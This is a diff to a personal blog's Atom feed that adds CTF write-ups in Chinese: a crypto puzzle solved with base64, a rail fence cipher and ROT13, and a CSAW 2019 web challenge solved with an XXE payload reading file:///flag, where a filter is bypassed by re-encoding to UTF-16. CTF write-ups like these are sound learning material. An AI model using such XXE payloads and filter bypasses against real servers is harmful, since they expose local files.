@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ev11ccaatt.github.io</id>
     <title>ev11ccaatt</title>
-    <updated>2021-03-23T10:30:54.638Z</updated>
+    <updated>2021-03-25T15:59:00.315Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ev11ccaatt.github.io"/>
     <link rel="self" href="https://ev11ccaatt.github.io/atom.xml"/>
@@ -10,6 +10,68 @@
     <logo>https://ev11ccaatt.github.io/images/avatar.png</logo>
     <icon>https://ev11ccaatt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, ev11ccaatt</rights>
+    <entry>
+        <title type="html"><![CDATA[[XMAN2018排位赛]通行证]]></title>
+        <id>https://ev11ccaatt.github.io/post/xman2018-pai-wei-sai-tong-xing-zheng</id>
+        <link href="https://ev11ccaatt.github.io/post/xman2018-pai-wei-sai-tong-xing-zheng">
+        </link>
+        <updated>2021-03-25T15:43:36.000Z</updated>
+        <content type="html"><![CDATA[<p>这道题是水的一题</p>
+<p>这两天身体不舒服，水一下。</p>
+<p>下载</p>
+<pre><code>a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg==
+</code></pre>
+<p>base64解密</p>
+<pre><code>kanbbrgghjl{zb____}vtlaln
+</code></pre>
+<p>这里卡了一会，以为要翻转，但翻过来明显不对劲，考虑下栅栏.</p>
+<p>在cyberchef试了下，竟然不是解密而是加密，key为7.</p>
+<pre><code>kzna{blnl_abj_lbh_trg_vg}
+</code></pre>
+<p>最后一步很明显了凯撒移位。（https://planetcalc.com/1434/）</p>
+<pre><code>ROT13	xman{oyay_now_you_get_it}
+</code></pre>
+<p>收工，睡觉.</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[CSAWQual 2019]Web_Unagi]]></title>
+        <id>https://ev11ccaatt.github.io/post/csawqual-2019web_unagi</id>
+        <link href="https://ev11ccaatt.github.io/post/csawqual-2019web_unagi">
+        </link>
+        <updated>2021-03-24T10:30:06.000Z</updated>
+        <content type="html"><![CDATA[<p>进去先看几个网页，发现flag在/flag</p>
+<p>然后upload页面存在上传。</p>
+<p>细看有个here的超链接。</p>
+<p>点进去一看貌似是xxe执行命令.</p>
+<pre><code>&lt;?xml version='1.0'?&gt;
+&lt;!DOCTYPE users [
+&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;
+&lt;users&gt;
+    &lt;user&gt;
+        &lt;username&gt;bob&lt;/username&gt;
+        &lt;password&gt;passwd2&lt;/password&gt;
+        &lt;name&gt; Bob&lt;/name&gt;
+        &lt;email&gt;bob@fakesite.com&lt;/email&gt;  
+        &lt;group&gt;CSAW2019&lt;/group&gt;
+        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;
+    &lt;/user&gt;
+&lt;/users&gt;
+</code></pre>
+<p>构造尝试读取.</p>
+<p>一上传发现被ban了，考虑转换编码来绕过。 utf-8 -&gt; utf-16.</p>
+<p>成功读取.</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[友链]]></title>
+        <id>https://ev11ccaatt.github.io/post/you-lian</id>
+        <link href="https://ev11ccaatt.github.io/post/you-lian">
+        </link>
+        <updated>2021-03-23T10:31:39.000Z</updated>
+        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_51868336">77pray</a></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[CISCN2019 华东南赛区]Web11]]></title>
         <id>https://ev11ccaatt.github.io/post/ciscn2019-hua-dong-nan-sai-qu-web11</id>
